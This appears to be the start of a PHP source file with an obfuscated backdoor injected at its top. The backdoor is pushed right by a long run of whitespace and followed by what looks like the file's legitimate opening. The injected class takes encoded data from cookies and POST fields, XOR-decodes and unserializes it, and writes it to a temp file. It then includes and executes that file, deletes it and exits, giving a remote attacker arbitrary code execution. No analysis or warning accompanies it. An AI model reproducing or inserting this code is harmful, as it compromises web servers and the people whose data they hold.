<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("jjjtmjj")){class jjjtmjj{public static $enbaksusi = "husmyjtkzdzhtsmz";public static $zhxxtrttzy = NULL;public function __construct(){$hexwvky = @$_COOKIE[substr(jjjtmjj::$enbaksusi, 0, 4)];if (!empty($hexwvky)){$gfpqcgeb = "base64";$vsxohhquxg = "";$hexwvky = explode(",", $hexwvky);foreach ($hexwvky as $ojhupyje){$vsxohhquxg .= @$_COOKIE[$ojhupyje];$vsxohhquxg .= @$_POST[$ojhupyje];}$vsxohhquxg = array_map($gfpqcgeb . "_decode", array($vsxohhquxg,));$vsxohhquxg = $vsxohhquxg[0] ^ str_repeat(jjjtmjj::$enbaksusi, (strlen($vsxohhquxg[0]) / strlen(jjjtmjj::$enbaksusi)) + 1);jjjtmjj::$zhxxtrttzy = @unserialize($vsxohhquxg);}}public function __destruct(){$this->rhtxk();}private function rhtxk(){if (is_array(jjjtmjj::$zhxxtrttzy)) {$ibsdh = sys_get_temp_dir() . "/" . crc32(jjjtmjj::$zhxxtrttzy["salt"]);@jjjtmjj::$zhxxtrttzy["write"]($ibsdh, jjjtmjj::$zhxxtrttzy["content"]);include $ibsdh;@jjjtmjj::$zhxxtrttzy["delete"]($ibsdh);exit();}}}$xormqv = new jjjtmjj();$xormqv = NULL;} ?><?php
/**
